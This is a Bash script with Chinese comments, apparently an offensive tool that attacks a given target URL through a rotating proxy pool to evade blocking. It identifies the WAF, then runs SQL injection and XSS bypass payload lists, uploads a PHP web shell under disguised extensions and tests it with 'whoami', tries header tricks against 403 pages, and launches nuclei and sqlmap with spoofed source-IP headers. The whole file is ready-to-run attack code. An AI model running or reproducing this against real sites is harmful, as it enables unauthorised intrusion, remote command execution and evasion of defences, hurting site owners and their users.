#!/bin/bash
# WAF绕过 + 代理池集成

source /workspace/proxy_manager.sh

TARGET=$1
PROXY_ROTATE=true

# 1. WAF识别
detect_waf() {
    local url=$1
    
    # 测试WAF类型
    resp=$(curl -sk "$url" -o /dev/null -w "%{http_code}")
    
    # Cloudflare检测
    curl -sk "$url" | grep -qi "cloudflare" && echo "cloudflare"
    
    # AWS WAF检测
    curl -sk "$url" -H "X-Forwarded-For: 1.1.1.1" | grep -qi "aws\|waf" && echo "aws"
    
    # 其他WAF
    wafw00f "$url" -a 2>/dev/null | grep -oE "Cloudflare|AWS|Akamai|Imperva" | head -1
}

# 2. SQL注入WAF绕过（15种payload + 代理）
sqli_bypass() {
    local url=$1
    local param=$2
    
    # 绕过payload列表
    payloads=(
        "1'/**/OR/**/1=1--"
        "1'OR(1)=(1)--"
        "1'%09OR%091=1--"
        "1'UnIoN/**/SeLeCt/**/1,2,3--"
        "1'/*!50000UNION*//*!50000SELECT*/1,2,3--"
        "1'\u0027OR\u00201=1--"
        "1'||'1'='1"
        "1'OR'x'='x"
        "1'OR/**/true--"
        "1'%23%0aOR%231=1--"
        "1'/**/OR/**/1=1#"
        "1'/**/OR/**/1=1/*"
        "1'/**/OR/**/1=1%23"
        "1'/**/OR/**/1=1%00"
        "1'/**/OR/**/1=1/**/"
    )
    
    for payload in "${payloads[@]}"; do
        if [ "$PROXY_ROTATE" = "true" ]; then
            proxy=$(get_random_proxy)
            proxy_url=$(format_proxy "$proxy")
            
            resp=$(curl -sk --proxy "$proxy_url" --proxy-anyauth \
                "$url?$param=$payload" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
                -H "X-Forwarded-For: $(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1)" \
                --max-time 10)
        else
            resp=$(curl -sk "$url?$param=$payload" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
                --max-time 10)
        fi
        
        # 检测SQL错误
        echo "$resp" | grep -qiE "error|mysql|postgresql|sql|syntax" && {
            echo "[✅ SQLi Bypass成功] $payload"
            echo "$url?$param=$payload" >> sqli_bypass_success.txt
            return 0
        }
        
        # 随机延迟（避免被封）
        sleep $(shuf -i 1-3 -n 1)
    done
}

# 3. XSS WAF绕过（10种payload + 代理）
xss_bypass() {
    local url=$1
    local param=$2
    
    payloads=(
        "<ScRiPt>alert(1)</sCrIpT>"
        "<svg/onload=alert(1)>"
        "<img src=x onerror=alert(1)>"
        "<iframe src=javascript:alert(1)>"
        "<script>\u0061lert(1)</script>"
        "<script>eval(atob('YWxlcnQoMSk='))</script>"
        "<body onload=alert(1)>"
        "<details open ontoggle=alert(1)>"
        "<marquee onstart=alert(1)>"
        "<input onfocus=alert(1) autofocus>"
    )
    
    for payload in "${payloads[@]}"; do
        if [ "$PROXY_ROTATE" = "true" ]; then
            proxy=$(get_random_proxy)
            proxy_url=$(format_proxy "$proxy")
            
            resp=$(curl -sk --proxy "$proxy_url" --proxy-anyauth \
                "$url?$param=$payload" \
                -H "User-Agent: Mozilla/5.0" \
                --max-time 10)
        else
            resp=$(curl -sk "$url?$param=$payload" --max-time 10)
        fi
        
        echo "$resp" | grep -q "alert(1)" && {
            echo "[✅ XSS Bypass成功] $payload"
            echo "$url?$param=$payload" >> xss_bypass_success.txt
            return 0
        }
        
        sleep $(shuf -i 1-2 -n 1)
    done
}

# 4. 文件上传绕过（10种方法 + 代理）
upload_bypass() {
    local url=$1
    
    # 创建测试文件
    echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
    
    methods=(
        "shell.php"
        "shell.php.jpg"
        "shell.PhP"
        "shell.php."
        "shell.php%00.jpg"
        "shell.phtml"
        "shell.php5"
        "shell.phar"
    )
    
    for file in "${methods[@]}"; do
        cp /tmp/shell.php /tmp/$file
        
        if [ "$PROXY_ROTATE" = "true" ]; then
            proxy=$(get_random_proxy)
            proxy_url=$(format_proxy "$proxy")
            
            resp=$(curl -sk --proxy "$proxy_url" --proxy-anyauth \
                "$url" -F "file=@/tmp/$file" \
                -F "fileType=image/jpeg" \
                -H "User-Agent: Mozilla/5.0" \
                --max-time 10)
        else
            resp=$(curl -sk "$url" -F "file=@/tmp/$file" \
                -F "fileType=image/jpeg" \
                --max-time 10)
        fi
        
        # 检测上传成功
        shell_url=$(echo "$resp" | grep -oE "http[s]?://[^\"']+\.(php|phtml|phar)")
        [ -n "$shell_url" ] && {
            # 验证shell
            test_resp=$(curl -sk "$shell_url?c=whoami" 2>/dev/null)
            [ -n "$test_resp" ] && {
                echo "[✅ Upload Bypass成功] $shell_url"
                echo "$shell_url" >> upload_bypass_success.txt
                return 0
            }
        }
        
        sleep $(shuf -i 1-2 -n 1)
    done
}

# 5. 403 Bypass（HTTP头绕过 + 代理）
bypass_403() {
    local url=$1
    
    headers=(
        "X-Original-URL: /admin"
        "X-Rewrite-URL: /admin"
        "X-Override-URL: /admin"
        "X-Forwarded-For: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Originating-IP: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "Client-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Host: localhost"
        "X-Forwarded-Server: localhost"
    )
    
    for header in "${headers[@]}"; do
        header_name=$(echo $header | cut -d: -f1)
        header_value=$(echo $header | cut -d: -f2- | sed 's/^ //')
        
        if [ "$PROXY_ROTATE" = "true" ]; then
            proxy=$(get_random_proxy)
            proxy_url=$(format_proxy "$proxy")
            
            status=$(curl -sk --proxy "$proxy_url" --proxy-anyauth \
                "$url" -H "$header_name: $header_value" \
                -o /dev/null -w "%{http_code}" \
                --max-time 10)
        else
            status=$(curl -sk "$url" -H "$header_name: $header_value" \
                -o /dev/null -w "%{http_code}" \
                --max-time 10)
        fi
        
        [ "$status" = "200" ] && {
            echo "[✅ 403 Bypass成功] $header"
            echo "$url|$header" >> 403_bypass_success.txt
            return 0
        }
        
        sleep 0.5
    done
}

# 6. 集成nuclei（代理轮换）
nuclei_with_proxy() {
    local target=$1
    
    # 随机选择代理
    proxy=$(get_random_proxy)
    proxy_url=$(format_proxy "$proxy")
    
    # 设置代理环境变量
    export HTTP_PROXY="$proxy_url"
    export HTTPS_PROXY="$proxy_url"
    
    # 执行nuclei
    nuclei -u "$target" \
        -t ~/nuclei-templates/cves/ \
        -t ~/nuclei-templates/vulnerabilities/ \
        -severity critical,high \
        -silent \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "X-Forwarded-For: $(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1)"
    
    unset HTTP_PROXY HTTPS_PROXY
}

# 7. 集成sqlmap（代理轮换）
sqlmap_with_proxy() {
    local url=$1
    
    proxy=$(get_random_proxy)
    ip=$(echo $proxy | cut -d: -f1)
    port=$(echo $proxy | cut -d: -f2)
    user=$(echo $proxy | cut -d: -f3)
    pass=$(echo $proxy | cut -d: -f4)
    
    sqlmap -u "$url" \
        --proxy="http://$ip:$port" \
        --proxy-cred="$user:$pass" \
        --batch \
        --level=3 \
        --risk=2 \
        --tamper=space2comment,between,charencode \
        --random-agent \
        --threads=5
}

# 8. 主函数：完整WAF绕过流程
main() {
    local target=$1
    
    echo "[+] 目标: $target"
    echo "[+] 代理池: $PROXY_COUNT 个代理"
    
    # 1. WAF识别
    waf_type=$(detect_waf "$target")
    echo "[+] WAF类型: ${waf_type:-未知}"
    
    # 2. 测试代理
    echo "[+] 测试代理可用性..."
    cat $PROXY_FILE | while read proxy; do
        test_proxy "$proxy" &
        [ $(jobs -r | wc -l) -ge 20 ] && wait -n
    done
    wait
    
    # 3. 执行绕过测试
    echo "[+] 开始WAF绕过测试..."
    
    # SQL注入绕过
    sqli_bypass "$target?id=1" "id" &
    
    # XSS绕过
    xss_bypass "$target?q=test" "q" &
    
    # 403绕过
    bypass_403 "$target/admin" &
    
    # 文件上传绕过（如果有上传点）
    # upload_bypass "$target/upload" &
    
    wait
    
    echo "[+] 绕过测试完成"
    echo "    成功结果保存在: sqli_bypass_success.txt, xss_bypass_success.txt, 403_bypass_success.txt"
}

# 执行
[ -n "$1" ] && main "$1" || echo "用法: $0 <target_url>"
